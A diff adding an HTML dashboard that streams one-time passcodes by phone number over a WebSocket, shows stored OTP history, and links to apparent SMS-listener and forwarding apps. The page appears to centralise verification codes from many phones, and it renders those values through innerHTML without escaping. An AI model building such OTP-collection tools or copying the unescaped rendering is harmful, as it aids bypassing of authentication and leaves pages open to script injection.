@@ -1,0 +1,634 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Real-Time OTP Viewer</title>
+    <style>
+        :root {
+            /* Light mode colors */
+            --bg-color: #f4f4f4;
+            --card-color: #fff;
+            --text-color: #2c3e50;
+            --border-color: #ddd;
+            --otp-bg: #e9ecef;
+            --status-connected: #4CAF50;
+            --status-disconnected: #e74c3c;
+            --button-primary: #4CAF50;
+            --button-primary-hover: #45a049;
+            --button-secondary: #4361ee;
+            --button-secondary-hover: #3a56d4;
+            --button-tertiary: #7209b7;
+            --button-tertiary-hover: #5a0891;
+            --filter-tag: #3498db;
+        }
+
+        /* Dark mode colors */
+        .dark-mode {
+            --bg-color: #1a1a1a;
+            --card-color: #2d2d2d;
+            --text-color: #f0f0f0;
+            --border-color: #444;
+            --otp-bg: #3a3a3a;
+            --status-connected: #2ecc71;
+            --status-disconnected: #e74c3c;
+            --button-primary: #27ae60;
+            --button-primary-hover: #2ecc71;
+            --button-secondary: #3498db;
+            --button-secondary-hover: #2980b9;
+            --button-tertiary: #9b59b6;
+            --button-tertiary-hover: #8e44ad;
+            --filter-tag: #3498db;
+        }
+
+        body {
+            font-family: Arial, sans-serif;
+            padding: 20px;
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            transition: background-color 0.3s, color 0.3s;
+        }
+
+        #otp-container {
+            max-width: 800px;
+            margin: auto;
+            padding: 20px;
+            background: var(--card-color);
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            transition: background-color 0.3s;
+        }
+
+        .otp-box {
+            margin-bottom: 15px;
+            padding: 15px;
+            background: var(--otp-bg);
+            border-radius: 5px;
+            border-left: 4px solid var(--button-primary);
+            transition: background-color 0.3s;
+        }
+
+        .otp-header {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 8px;
+            font-weight: bold;
+        }
+
+        .otp-phone {
+            color: var(--text-color);
+            font-size: 1.1em;
+        }
+
+        .otp-time {
+            color: #7f8c8d;
+            font-size: 0.9em;
+        }
+
+        .otp-code {
+            font-size: 1.2em;
+            color: #e74c3c;
+            margin: 5px 0;
+        }
+
+        .otp-purpose {
+            display: inline-block;
+            padding: 3px 8px;
+            background: var(--button-secondary);
+            color: white;
+            border-radius: 3px;
+            font-size: 0.8em;
+            transition: background-color 0.3s;
+        }
+
+        h1 {
+            color: var(--text-color);
+            text-align: center;
+            margin-bottom: 30px;
+            transition: color 0.3s;
+        }
+
+        .filter-section, .download-section {
+            max-width: 800px;
+            margin: 20px auto;
+            padding: 15px;
+            background: var(--card-color);
+            border-radius: 5px;
+            box-shadow: 0 0 5px rgba(0,0,0,0.1);
+            transition: background-color 0.3s;
+        }
+
+        .filter-title, .download-title {
+            margin-top: 0;
+            color: var(--text-color);
+            font-size: 1.1em;
+            transition: color 0.3s;
+        }
+
+        .filter-input-container {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 10px;
+        }
+
+        .filter-input {
+            flex: 1;
+            padding: 8px 12px;
+            border: 1px solid var(--border-color);
+            border-radius: 4px;
+            font-size: 0.95em;
+            background-color: var(--card-color);
+            color: var(--text-color);
+            transition: all 0.3s;
+        }
+
+        .filter-buttons {
+            display: flex;
+            gap: 10px;
+        }
+
+        .filter-button {
+            padding: 8px 15px;
+            background-color: var(--button-primary);
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 0.9em;
+            transition: background-color 0.3s;
+        }
+
+        .filter-button:hover {
+            background-color: var(--button-primary-hover);
+        }
+
+        .filter-button.clear {
+            background-color: var(--status-disconnected);
+        }
+
+        .filter-button.clear:hover {
+            background-color: #c0392b;
+        }
+
+        .status-indicator {
+            display: inline-block;
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background-color: var(--status-connected);
+            margin-right: 5px;
+            transition: background-color 0.3s;
+        }
+
+        .status-disconnected {
+            background-color: var(--status-disconnected);
+        }
+
+        .tag-container {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 5px;
+            margin-top: 10px;
+        }
+
+        .phone-tag {
+            background-color: var(--filter-tag);
+            color: white;
+            padding: 3px 8px;
+            border-radius: 12px;
+            font-size: 0.8em;
+            display: flex;
+            align-items: center;
+            transition: background-color 0.3s;
+        }
+
+        .tag-remove {
+            margin-left: 5px;
+            cursor: pointer;
+        }
+
+        /* Download section styles */
+        .download-list {
+            list-style: none;
+            padding: 0;
+        }
+
+        .download-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px 0;
+            border-bottom: 1px solid var(--border-color);
+            transition: border-color 0.3s;
+        }
+
+        .download-item:last-child {
+            border-bottom: none;
+        }
+
+        .download-button {
+            padding: 6px 12px;
+            background-color: var(--button-secondary);
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 0.85em;
+            text-decoration: none;
+            display: inline-block;
+            transition: background-color 0.3s;
+        }
+
+        .download-button:hover {
+            background-color: var(--button-secondary-hover);
+        }
+
+        .fetch-data-button {
+            display: block;
+            width: 100%;
+            padding: 10px;
+            margin-top: 10px;
+            background-color: var(--button-tertiary);
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 0.9em;
+            text-align: center;
+            transition: background-color 0.3s;
+        }
+
+        .fetch-data-button:hover {
+            background-color: var(--button-tertiary-hover);
+        }
+
+        /* Improved Dark Mode Toggle */
+        .dark-mode-toggle {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            z-index: 100;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .toggle-switch {
+            position: relative;
+            display: inline-block;
+            width: 60px;
+            height: 30px;
+        }
+
+        .toggle-switch input {
+            opacity: 0;
+            width: 0;
+            height: 0;
+        }
+
+        .toggle-slider {
+            position: absolute;
+            cursor: pointer;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: #ccc;
+            transition: .4s;
+            border-radius: 34px;
+        }
+
+        .toggle-slider:before {
+            position: absolute;
+            content: "";
+            height: 22px;
+            width: 22px;
+            left: 4px;
+            bottom: 4px;
+            background-color: white;
+            transition: .4s;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        /* Sun/Moon icons inside the slider */
+        .toggle-slider:after {
+            content: "☀️";
+            position: absolute;
+            left: 8px;
+            top: 50%;
+            transform: translateY(-50%);
+            opacity: 1;
+            transition: .4s;
+            font-size: 14px;
+        }
+
+        .dark-mode .toggle-slider:after {
+            content: "🌙";
+            left: auto;
+            right: 8px;
+            opacity: 1;
+        }
+
+        input:checked + .toggle-slider {
+            background-color: #2196F3;
+        }
+
+        input:checked + .toggle-slider:before {
+            transform: translateX(30px);
+        }
+
+        /* Hide the old label container */
+        .toggle-label {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <!-- Dark Mode Toggle -->
+    <div class="dark-mode-toggle">
+        <label class="toggle-switch">
+            <input type="checkbox" id="dark-mode-toggle">
+            <span class="toggle-slider"></span>
+        </label>
+    </div>
+
+    <h1>Real-Time OTP Viewer</h1>
+    
+    <!-- Updated Download section with local file paths -->
+    <div class="download-section">
+        <h3 class="download-title">Download One of these Apps</h3>
+        <ul class="download-list">
+            <li class="download-item">
+			<span>Ivacfwd4.4</span>
+                <a href="/download/Ivacfwd4.4" class="download-button">Download</a>
+            </li>
+			<li class="download-item">
+                <span>smslistener_kolpov2</span>
+                <a href="/download/smslistener" class="download-button">Download</a>
+            </li>
+            <li class="download-item">
+                <span>ivac otp kolpo</span>
+                <a href="/download/ivac" class="download-button">Download</a>
+            </li>
+        </ul>
+        <button class="fetch-data-button" id="fetch-data-button">View All OTP Data (/fetch-otp-data)</button>
+    </div>
+    
+    <!-- Filter section -->
+    <div class="filter-section">
+        <h3 class="filter-title">Filter by Phone Numbers</h3>
+        <div class="filter-input-container">
+            <input type="text" class="filter-input" id="phone-filter" 
+                   placeholder="Enter phone number and press Enter/Add">
+            <button class="filter-button" id="add-filter">Add</button>
+        </div>
+        <div class="tag-container" id="phone-tags"></div>
+        <div class="filter-buttons">
+            <button class="filter-button" id="apply-filter">Apply Filter</button>
+            <button class="filter-button clear" id="clear-filter">Clear All</button>
+        </div>
+        <div style="margin-top: 10px; font-size: 0.9em;">
+            <span class="status-indicator" id="connection-status-indicator"></span>
+            <span id="connection-status-text">Connecting...</span>
+        </div>
+    </div>
+    
+    <div id="otp-container">
+        <!-- OTP entries will appear here -->
+    </div>
+
+    <script>
+        // Dark mode toggle functionality
+        const darkModeToggle = document.getElementById('dark-mode-toggle');
+        const body = document.body;
+
+        // Check for saved user preference or use system preference
+        if (localStorage.getItem('darkMode') === 'enabled' || 
+            (!localStorage.getItem('darkMode') && window.matchMedia('(prefers-color-scheme: dark)').matches)) {
+            enableDarkMode();
+        }
+
+        darkModeToggle.addEventListener('change', () => {
+            if (darkModeToggle.checked) {
+                enableDarkMode();
+            } else {
+                disableDarkMode();
+            }
+        });
+
+        function enableDarkMode() {
+            body.classList.add('dark-mode');
+            darkModeToggle.checked = true;
+            localStorage.setItem('darkMode', 'enabled');
+        }
+
+        function disableDarkMode() {
+            body.classList.remove('dark-mode');
+            darkModeToggle.checked = false;
+            localStorage.setItem('darkMode', 'disabled');
+        }
+
+        // Rest of your existing JavaScript (OTP functionality)
+        const ws = new WebSocket('wss://render.com');
+        const otpContainer = document.getElementById('otp-container');
+        const phoneFilter = document.getElementById('phone-filter');
+        const addFilterBtn = document.getElementById('add-filter');
+        const applyFilterBtn = document.getElementById('apply-filter');
+        const clearFilterBtn = document.getElementById('clear-filter');
+        const phoneTagsContainer = document.getElementById('phone-tags');
+        const statusIndicator = document.getElementById('connection-status-indicator');
+        const statusText = document.getElementById('connection-status-text');
+        const fetchDataButton = document.getElementById('fetch-data-button');
+        
+        let currentOtps = []; // Stores OTPs received in current session
+        let filteredOtps = []; // Stores filtered historical OTPs
+        let filterNumbers = []; // Stores numbers to filter by
+        
+        // Initialize WebSocket
+        ws.onopen = () => {
+            console.log('WebSocket connected');
+            updateConnectionStatus(true);
+        };
+
+        ws.onmessage = (event) => {
+            const data = JSON.parse(event.data);
+            
+            // Handle both single OTP and batch of OTPs
+            if (Array.isArray(data)) {
+                data.forEach(otpData => processNewOtp(otpData));
+            } else {
+                processNewOtp(data);
+            }
+        };
+
+        ws.onclose = () => {
+            console.log('WebSocket connection closed');
+            updateConnectionStatus(false);
+        };
+
+        ws.onerror = (error) => {
+            console.error('WebSocket error:', error);
+            updateConnectionStatus(false, 'Connection Error');
+        };
+
+        // Open fetch-otp-data endpoint in new tab
+        fetchDataButton.addEventListener('click', () => {
+            window.open('/fetch-otp-data', '_blank');
+        });
+
+        // Process new OTP (both for display and storage)
+        function processNewOtp(otpData) {
+            // Add to current session OTPs (at beginning)
+            currentOtps.unshift(otpData);
+            
+            // Display immediately if:
+            // 1. No filter is active, OR
+            // 2. Matches current filter
+            if (filterNumbers.length === 0 || 
+                filterNumbers.some(num => otpData.phone.includes(num))) {
+                displayOtp(otpData, true); // true = prepend
+            }
+        }
+
+        // Add phone number to filter list
+        function addFilterNumber() {
+            const number = phoneFilter.value.trim();
+            if (number && !filterNumbers.includes(number)) {
+                filterNumbers.push(number);
+                renderPhoneTags();
+                phoneFilter.value = '';
+            }
+        }
+
+        // Remove phone number from filter list
+        function removeFilterNumber(number) {
+            filterNumbers = filterNumbers.filter(n => n !== number);
+            renderPhoneTags();
+        }
+
+        // Render phone number tags
+        function renderPhoneTags() {
+            phoneTagsContainer.innerHTML = '';
+            filterNumbers.forEach(number => {
+                const tag = document.createElement('div');
+                tag.className = 'phone-tag';
+                tag.innerHTML = `
+                    ${number}
+                    <span class="tag-remove" onclick="removeFilterNumber('${number}')">×</span>
+                `;
+                phoneTagsContainer.appendChild(tag);
+            });
+        }
+
+        // Apply filter - fetch historical OTPs
+        async function applyFilter() {
+            if (filterNumbers.length === 0) return;
+            
+            try {
+                const response = await fetch('/fetch-otp-data');
+                const data = await response.json();
+                
+                // Process all historical OTPs
+                filteredOtps = [];
+                Object.entries(data).forEach(([phone, records]) => {
+                    if (filterNumbers.some(num => phone.includes(num))) {
+                        // Add all OTPs for matching numbers
+                        records.forEach(record => {
+                            filteredOtps.push({
+                                phone,
+                                otp: record.otp,
+                                purpose: record.purpose,
+                                timestamp: record.timestamp
+                            });
+                        });
+                    }
+                });
+                
+                // Sort by timestamp (newest first)
+                filteredOtps.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
+                
+                // Update display
+                updateDisplay();
+            } catch (error) {
+                console.error('Error fetching OTP history:', error);
+            }
+        }
+
+        // Clear all filters
+        function clearFilter() {
+            filterNumbers = [];
+            filteredOtps = [];
+            renderPhoneTags();
+            updateDisplay();
+        }
+
+        // Update the display based on current mode
+        function updateDisplay() {
+            otpContainer.innerHTML = '';
+            
+            if (filterNumbers.length === 0) {
+                // Normal mode - show all current OTPs (newest first)
+                currentOtps.forEach(otp => displayOtp(otp, false));
+            } else {
+                // Filtered mode - show historical + current (all sorted newest first)
+                const allOtps = [
+                    ...currentOtps.filter(otp => 
+                        filterNumbers.some(num => otp.phone.includes(num))
+                    ),
+                    ...filteredOtps
+                ].sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
+                
+                allOtps.forEach(otp => displayOtp(otp, false));
+            }
+        }
+
+        // Display a single OTP (with position control)
+        function displayOtp({ phone, otp, purpose = 'unknown', timestamp }, prepend = false) {
+            const otpBox = document.createElement('div');
+            otpBox.className = 'otp-box';
+            
+            const formattedTime = timestamp ? new Date(timestamp).toLocaleString() : 'Just now';
+            const purposeClass = purpose ? `purpose-${purpose.toLowerCase()}` : 'purpose-unknown';
+            
+            otpBox.innerHTML = `
+                <div class="otp-header">
+                    <span class="otp-phone">${phone}</span>
+                    <span class="otp-time">${formattedTime}</span>
+                </div>
+                <div class="otp-code">OTP: ${otp}</div>
+                <div>
+                    <span class="otp-purpose ${purposeClass}">${purpose}</span>
+                </div>
+            `;
+            
+            // Add to top or bottom of container
+            if (prepend && otpContainer.firstChild) {
+                otpContainer.insertBefore(otpBox, otpContainer.firstChild);
+            } else {
+                otpContainer.appendChild(otpBox);
+            }
+        }
+
+        // Update connection status
+        function updateConnectionStatus(isConnected, message = null) {
+            statusIndicator.className = isConnected ? 'status-indicator' : 'status-indicator status-disconnected';
+            statusText.textContent = message || (isConnected ? 'Connected (Live)' : 'Disconnected');
+        }
+
+        // Event listeners
+        addFilterBtn.addEventListener('click', addFilterNumber);
+        applyFilterBtn.addEventListener('click', applyFilter);
+        clearFilterBtn.addEventListener('click', clearFilter);
+        
+        phoneFilter.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') addFilterNumber();
+        });
+
+        // Make removeFilterNumber available globally
+        window.removeFilterNumber = removeFilterNumber;
+    </script>
+</body>
+</html>
